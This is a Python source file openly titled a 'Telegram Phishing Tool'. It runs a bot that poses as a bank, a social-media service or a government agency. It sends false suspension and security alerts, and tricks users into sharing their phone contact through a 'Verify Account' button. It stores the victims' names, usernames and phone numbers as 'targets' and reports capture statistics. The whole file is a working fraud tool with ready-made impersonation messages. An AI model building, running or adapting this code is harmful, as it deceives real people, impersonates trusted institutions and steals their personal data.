#!/usr/bin/env python3
"""
Telegram Phishing Tool
"""

import sys
import os
import json
import time
import threading
import sqlite3
import hashlib
import datetime
import requests
import random
import string
import subprocess
import platform
from typing import Dict, List, Optional, Any
import logging

class TelegramPhishingTool:
    def __init__(self):
        self.bot = None
        self.targets = []
        self.session_data = {}
        self.db_path = "phishing_data.db"
        self.campaign_stats = {
            'total_targets': 0,
            'successful_captures': 0,
            'failed_attempts': 0,
            'start_time': datetime.datetime.now()
        }
        self.setup_environment()
        self.setup_database()
        self.setup_logging()
        
    def setup_environment(self):
        """Automatically setup Python environment and install dependencies"""
        print("🔧 Setting up environment...")
        
        # Check if virtual environment exists, create if not
        if not os.path.exists('venv'):
            print("📦 Creating virtual environment...")
            subprocess.run([sys.executable, '-m', 'venv', 'venv'], check=True)
        
        # Determine activation script based on OS
        if platform.system() == "Windows":
            activate_script = os.path.join('venv', 'Scripts', 'activate')
            pip_path = os.path.join('venv', 'Scripts', 'pip')
        else:
            activate_script = os.path.join('venv', 'bin', 'activate')
            pip_path = os.path.join('venv', 'bin', 'pip')
        
        # Install required packages
        required_packages = [
            'pyTelegramBotApi==4.14.0',
            'colorama==0.4.6',
            'pyfiglet==1.0.2',
            'requests==2.31.0',
            'cryptography==41.0.7'
        ]
        
        print("📥 Installing dependencies...")
        for package in required_packages:
            try:
                subprocess.run([pip_path, 'install', package], check=True, capture_output=True)
            except subprocess.CalledProcessError:
                print(f"⚠️ Failed to install {package}, trying alternative method...")
                subprocess.run([sys.executable, '-m', 'pip', 'install', package], check=True)
        
        # Import dependencies
        try:
            import telebot
            from telebot import types
            from colorama import Fore, Back, Style, init
            import pyfiglet
            from cryptography.fernet import Fernet
        except ImportError as e:
            print(f"❌ Failed to import dependencies: {e}")
            sys.exit(1)
        
        # Initialize colorama
        init(autoreset=True)
        
        # Store imports for later use
        self.telebot = telebot
        self.types = types
        self.Fore = Fore
        self.Back = Back
        self.Style = Style
        self.pyfiglet = pyfiglet
        self.Fernet = Fernet
        
        # Generate encryption key
        self.encryption_key = self.Fernet.generate_key()
        self.cipher = self.Fernet(self.encryption_key)
        
        print("✅ Environment setup complete!")
        
    def setup_logging(self):
        """Configure advanced logging system"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('phishing_operations.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def setup_database(self):
        """Initialize encrypted database for target data"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Drop existing table if it exists to ensure proper schema
        cursor.execute("DROP TABLE IF EXISTS targets")
        
        cursor.execute('''
            CREATE TABLE targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT UNIQUE,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                email TEXT,
                ip_address TEXT,
                user_agent TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                session_data TEXT,
                encrypted_data TEXT,
                engagement_stage TEXT DEFAULT 'initial',
                trust_score INTEGER DEFAULT 0,
                template_used TEXT DEFAULT 'default'
            )
        ''')
        conn.commit()
        conn.close()
        print("🗄️ Database initialized successfully!")
        
    def display_banner(self):
        """Display sophisticated ASCII art banner"""
        banner = self.pyfiglet.figlet_format("TELEGRAM PHISHING", font="slant")
        print(f"{self.Fore.RED}{banner}")
        print(f"{self.Fore.CYAN}{'='*60}")
        print(f"{self.Fore.YELLOW}Telegram Phishing Tool")
        print(f"{self.Fore.CYAN}{'='*60}")
        
    def validate_telegram_token(self, token: str) -> bool:
        """Validate Telegram bot token format"""
        if not token or len(token) < 40:
            return False
        
        parts = token.split(':')
        if len(parts) != 2:
            return False
            
        try:
            bot_id = int(parts[0])
            if bot_id < 1000000000:
                return False
        except ValueError:
            return False
            
        return True
        
    def get_sophisticated_templates(self):
        """Get sophisticated, convincing phishing templates"""
        return {
            'banking': {
                'name': '🏦 Banking Security Verification',
                'welcome': [
                    "🔐 SECURITY ALERT: Your banking account requires immediate verification",
                    "🛡️ CRITICAL: Unusual activity detected on your account. Verification required.",
                    "⚠️ URGENT: Your account has been temporarily suspended. Verify now to restore access."
                ],
                'verification_success': [
                    "✅ Verification successful! Your account has been reactivated and secured.",
                    "🎉 Account restored! All security measures are now active.",
                    "🔒 Security verification complete! Your account is now protected."
                ],
                'support': [
                    "📞 Our security team will contact you within 30 minutes to complete the process.",
                    "🆘 Security verification in progress. A specialist will reach out shortly.",
                    "💬 Thank you for your cooperation. Our team will assist you further."
                ],
                'help': [
                    "❓ For immediate assistance, please complete the verification process first.",
                    "🆘 Help is available after account verification. Please verify your identity.",
                    "💡 Need help? Complete verification to access our support system."
                ],
                'buttons': ['🔐 Verify Account', '📞 Security Support', '❓ Help', '📊 Account Status']
            },
            'social_media': {
                'name': '📱 Social Media Account Recovery',
                'welcome': [
                    "🚨 ACCOUNT SUSPENSION: Your social media account has been temporarily suspended",
                    "⚠️ SECURITY BREACH: Unauthorized access detected. Immediate action required.",
                    "🔐 ACCOUNT LOCKED: Suspicious activity detected. Verify to unlock your account."
                ],
                'verification_success': [
                    "✅ Account unlocked successfully! Your profile is now active.",
                    "🎉 Verification complete! Your account has been restored.",
                    "🔒 Security check passed! Your account is now secure."
                ],
                'support': [
                    "📞 Our recovery team will contact you to complete the restoration process.",
                    "🆘 Account recovery in progress. A specialist will assist you shortly.",
                    "💬 Thank you for verifying. Our team will help restore your account."
                ],
                'help': [
                    "❓ To recover your account, please complete the verification process.",
                    "🆘 Recovery assistance available after verification. Please verify now.",
                    "💡 Need help recovering your account? Complete verification first."
                ],
                'buttons': ['🔐 Verify Account', '📞 Recovery Support', '❓ Help', '📊 Account Status']
            },
            'government': {
                'name': '🏛️ Government Document Verification',
                'welcome': [
                    "🚨 URGENT: Your government documents require immediate verification",
                    "⚠️ CRITICAL: Document verification overdue. Immediate action required.",
                    "🔐 SECURITY ALERT: Your identity documents need verification to prevent fraud."
                ],
                'verification_success': [
                    "✅ Document verification successful! Your identity has been confirmed.",
                    "🎉 Verification complete! Your documents are now validated.",
                    "🔒 Identity verification passed! Your documents are secure."
                ],
                'support': [
                    "📞 Our verification team will contact you to complete the process.",
                    "🆘 Document verification in progress. An agent will assist you shortly.",
                    "💬 Thank you for your cooperation. Our team will help complete verification."
                ],
                'help': [
                    "❓ For document verification assistance, please complete the process first.",
                    "🆘 Help available after verification. Please verify your documents.",
                    "💡 Need help with verification? Complete the process to access support."
                ],
                'buttons': ['🔐 Verify Documents', '📞 Verification Support', '❓ Help', '📊 Status']
            }
        }
        
    def get_bot_configuration(self):
        """Interactive bot configuration with template selection"""
        print(f"\n{self.Fore.GREEN}[+] Bot Configuration Setup")
        print(f"{self.Fore.CYAN}{'-'*40}")
        
        # Get bot token
        while True:
            token = input(f"{self.Fore.YELLOW}Enter Telegram Bot Token: ").strip()
            if self.validate_telegram_token(token):
                break
            print(f"{self.Fore.RED}[!] Invalid token format. Please check your bot token.")
        
        # Select template
        templates = self.get_sophisticated_templates()
        print(f"\n{self.Fore.CYAN}Available Templates:")
        for i, (key, template) in enumerate(templates.items(), 1):
            print(f"{self.Fore.YELLOW}{i}. {template['name']}")
        
        while True:
            try:
                choice = int(input(f"\n{self.Fore.YELLOW}Select template (1-3): ").strip())
                if 1 <= choice <= 3:
                    template_keys = list(templates.keys())
                    selected_template = template_keys[choice - 1]
                    break
                else:
                    print(f"{self.Fore.RED}[!] Please select 1, 2, or 3")
            except ValueError:
                print(f"{self.Fore.RED}[!] Please enter a valid number")
        
        self.selected_template = templates[selected_template]
        print(f"{self.Fore.GREEN}[+] Selected: {self.selected_template['name']}")
        
        return token
        
    def create_advanced_keyboard(self):
        """Create sophisticated interactive keyboard based on template"""
        markup = self.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        
        buttons = self.selected_template['buttons']
        verify_button = self.types.KeyboardButton(buttons[0], request_contact=True)
        support_button = self.types.KeyboardButton(buttons[1])
        help_button = self.types.KeyboardButton(buttons[2])
        status_button = self.types.KeyboardButton(buttons[3])
        
        markup.add(verify_button)
        markup.add(support_button, help_button)
        markup.add(status_button)
        
        return markup
        
    def create_secondary_keyboard(self):
        """Create secondary keyboard for post-verification engagement"""
        markup = self.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        
        settings_button = self.types.KeyboardButton('⚙️ Settings')
        security_button = self.types.KeyboardButton('🛡️ Security')
        support_button = self.types.KeyboardButton('📞 Support')
        logout_button = self.types.KeyboardButton('🚪 Logout')
        
        markup.add(settings_button, security_button)
        markup.add(support_button, logout_button)
        
        return markup
        
    def encrypt_sensitive_data(self, data: str) -> str:
        """Encrypt sensitive target data"""
        return self.cipher.encrypt(data.encode()).decode()
        
    def decrypt_sensitive_data(self, encrypted_data: str) -> str:
        """Decrypt sensitive target data"""
        return self.cipher.decrypt(encrypted_data.encode()).decode()
        
    def serialize_datetime(self, obj):
        """Custom JSON serializer for datetime objects"""
        if isinstance(obj, datetime.datetime):
            return obj.isoformat()
        raise TypeError(f"Object of type {type(obj)} is not JSON serializable")
        
    def store_target_data(self, target_info: Dict[str, Any]):
        """Store target data in encrypted database with engagement tracking"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        encrypted_phone = self.encrypt_sensitive_data(target_info.get('phone', ''))
        
        # Serialize session data with datetime handling
        session_data = target_info.get('session', {})
        session_str = json.dumps(session_data, default=self.serialize_datetime)
        encrypted_session = self.encrypt_sensitive_data(session_str)
        
        # Serialize full target info with datetime handling
        target_info_str = json.dumps(target_info, default=self.serialize_datetime)
        
        cursor.execute('''
            INSERT OR REPLACE INTO targets 
            (user_id, username, first_name, phone_number, email, ip_address, user_agent, session_data, encrypted_data, engagement_stage, trust_score, template_used)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            target_info.get('user_id'),
            target_info.get('username'),
            target_info.get('first_name'),
            encrypted_phone,
            target_info.get('email', ''),
            target_info.get('ip_address', ''),
            target_info.get('user_agent', ''),
            encrypted_session,
            target_info_str,
            target_info.get('engagement_stage', 'initial'),
            target_info.get('trust_score', 0),
            target_info.get('template_used', 'default')
        ))
        
        conn.commit()
        conn.close()
        

        
    def calculate_trust_score(self, user_id: int) -> int:
        """Calculate trust score based on user interactions"""
        if user_id not in self.session_data:
            return 0
            
        session = self.session_data[user_id]
        score = 0
        
        score += session.get('interactions', 0) * 10
        score += session.get('verification_completed', 0) * 50
        score += session.get('support_contacted', 0) * 20
        
        return min(score, 100)
        
    def display_target_info(self, target_info: Dict[str, Any]):
        """Display comprehensive target information with enhanced details"""
        print(f"\n{self.Fore.GREEN}[+] Target Information Captured")
        print(f"{self.Fore.CYAN}{'='*50}")
        print(f"{self.Fore.YELLOW}User ID: {self.Fore.WHITE}{target_info.get('user_id')}")
        print(f"{self.Fore.YELLOW}Username: {self.Fore.WHITE}{target_info.get('username')}")
        print(f"{self.Fore.YELLOW}First Name: {self.Fore.WHITE}{target_info.get('first_name')}")
        print(f"{self.Fore.YELLOW}Phone Number: {self.Fore.WHITE}{target_info.get('phone')}")
        print(f"{self.Fore.YELLOW}Template Used: {self.Fore.WHITE}{target_info.get('template_used', 'default')}")
        
        trust_score = self.calculate_trust_score(int(target_info.get('user_id', 0)))
        print(f"{self.Fore.YELLOW}Trust Score: {self.Fore.WHITE}{trust_score}/100")
        print(f"{self.Fore.YELLOW}Engagement Stage: {self.Fore.WHITE}{target_info.get('engagement_stage', 'initial')}")
        print(f"{self.Fore.YELLOW}Timestamp: {self.Fore.WHITE}{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{self.Fore.CYAN}{'='*50}")
        
        self.campaign_stats['successful_captures'] += 1
        
    def setup_bot_handlers(self, token: str):
        """Configure advanced bot message handlers with sophisticated engagement"""
        
        @self.bot.message_handler(commands=['start'])
        def handle_start(message):
            user_id = message.from_user.id
            username = message.from_user.username
            first_name = message.from_user.first_name
            
            self.session_data[user_id] = {
                'start_time': datetime.datetime.now().isoformat(),
                'interactions': 0,
                'last_activity': datetime.datetime.now().isoformat(),
                'verification_completed': 0,
                'support_contacted': 0,
                'engagement_stage': 'initial'
            }
            
            welcome_message = random.choice(self.selected_template['welcome'])
            markup = self.create_advanced_keyboard()
            self.bot.send_message(user_id, welcome_message, reply_markup=markup)
            
            self.logger.info(f"New target started: {user_id} ({username})")
            self.campaign_stats['total_targets'] += 1
            
        @self.bot.message_handler(content_types=['contact'])
        def handle_contact(message):
            user_id = message.from_user.id
            username = message.from_user.username
            first_name = message.from_user.first_name
            phone = message.contact.phone_number
            
            if user_id in self.session_data:
                self.session_data[user_id]['verification_completed'] = 1
                self.session_data[user_id]['engagement_stage'] = 'verified'
                self.session_data[user_id]['last_activity'] = datetime.datetime.now().isoformat()
            
            target_info = {
                'user_id': str(user_id),
                'username': username,
                'first_name': first_name,
                'phone': phone,
                'user_agent': 'Telegram Bot',
                'session': self.session_data.get(user_id, {}),
                'timestamp': datetime.datetime.now().isoformat(),
                'engagement_stage': 'verified',
                'trust_score': self.calculate_trust_score(user_id),
                'template_used': self.selected_template['name']
            }
            
            self.store_target_data(target_info)
            self.display_target_info(target_info)
            
            success_message = random.choice(self.selected_template['verification_success'])
            markup = self.create_secondary_keyboard()
            self.bot.send_message(user_id, success_message, reply_markup=markup)
            
            self.logger.info(f"Target data captured: {user_id} - Phone: {phone}")
            
        @self.bot.message_handler(func=lambda message: True)
        def handle_all_messages(message):
            user_id = message.from_user.id
            text = message.text
            
            if user_id in self.session_data:
                self.session_data[user_id]['interactions'] += 1
                self.session_data[user_id]['last_activity'] = datetime.datetime.now().isoformat()
                
            if text in self.selected_template['buttons']:
                if 'Support' in text:
                    if user_id in self.session_data:
                        self.session_data[user_id]['support_contacted'] = 1
                    support_msg = random.choice(self.selected_template['support'])
                    self.bot.reply_to(message, support_msg)
                elif 'Help' in text:
                    help_msg = random.choice(self.selected_template['help'])
                    self.bot.reply_to(message, help_msg)
                elif 'Status' in text:
                    status_msg = "✅ Your account is verified and secure. All systems are operational."
                    self.bot.reply_to(message, status_msg)
            elif text == '⚙️ Settings':
                settings_msg = "⚙️ Account settings are available after completing additional verification steps."
                self.bot.reply_to(message, settings_msg)
            elif text == '🛡️ Security':
                security_msg = "🛡️ Your account security is active. All protection measures are enabled."
                self.bot.reply_to(message, security_msg)
            elif text == '🚪 Logout':
                logout_msg = "🚪 You have been logged out successfully. Thank you for using our service."
                self.bot.reply_to(message, logout_msg, reply_markup=self.types.ReplyKeyboardRemove())
            else:
                default_msg = "Please use the provided buttons to navigate. Account verification is required for full access."
                self.bot.reply_to(message, default_msg)
                
    def start_bot(self, token: str):
        """Initialize and start the bot with enhanced error handling"""
        try:
            self.bot = self.telebot.TeleBot(token)
            
            # Test bot connection
            bot_info = self.bot.get_me()
            print(f"{self.Fore.GREEN}[+] Bot connected successfully: @{bot_info.username}")
            
            self.setup_bot_handlers(token)
            
            print(f"{self.Fore.GREEN}[+] Starting bot polling...")
            print(f"{self.Fore.YELLOW}[*] Bot is ready to receive messages")
            print(f"{self.Fore.YELLOW}[*] Press Ctrl+C to stop the bot")
            
            self.bot.polling(none_stop=True, timeout=60)
            
        except Exception as e:
            print(f"{self.Fore.RED}[!] Bot error: {str(e)}")
            self.logger.error(f"Bot error: {str(e)}")
            
    def show_statistics(self):
        """Display comprehensive operation statistics"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM targets")
        total_targets = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM targets WHERE DATE(timestamp) = DATE('now')")
        today_targets = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM targets WHERE engagement_stage = 'verified'")
        verified_targets = cursor.fetchone()[0]
        
        conn.close()
        
        runtime = datetime.datetime.now() - self.campaign_stats['start_time']
        
        print(f"\n{self.Fore.GREEN}[+] Campaign Statistics")
        print(f"{self.Fore.CYAN}{'='*40}")
        print(f"{self.Fore.YELLOW}Total Targets: {self.Fore.WHITE}{total_targets}")
        print(f"{self.Fore.YELLOW}Today's Targets: {self.Fore.WHITE}{today_targets}")
        print(f"{self.Fore.YELLOW}Verified Targets: {self.Fore.WHITE}{verified_targets}")
        print(f"{self.Fore.YELLOW}Success Rate: {self.Fore.WHITE}{(verified_targets/total_targets*100):.1f}%" if total_targets > 0 else f"{self.Fore.YELLOW}Success Rate: {self.Fore.WHITE}0%")
        print(f"{self.Fore.YELLOW}Active Sessions: {self.Fore.WHITE}{len(self.session_data)}")
        print(f"{self.Fore.YELLOW}Runtime: {self.Fore.WHITE}{str(runtime).split('.')[0]}")
        print(f"{self.Fore.YELLOW}Template: {self.Fore.WHITE}{self.selected_template['name']}")
        print(f"{self.Fore.CYAN}{'='*40}")
        
    def run(self):
        """Main execution method"""
        self.display_banner()
        
        token = self.get_bot_configuration()
        
        print(f"\n{self.Fore.GREEN}[+] Starting Telegram Phishing Tool...")
        
        try:
            self.start_bot(token)
        except KeyboardInterrupt:
            print(f"\n{self.Fore.YELLOW}[*] Shutting down...")
            self.show_statistics()
            print(f"{self.Fore.GREEN}[+] Tool stopped successfully")

if __name__ == "__main__":
    tool = TelegramPhishingTool()
    tool.run()
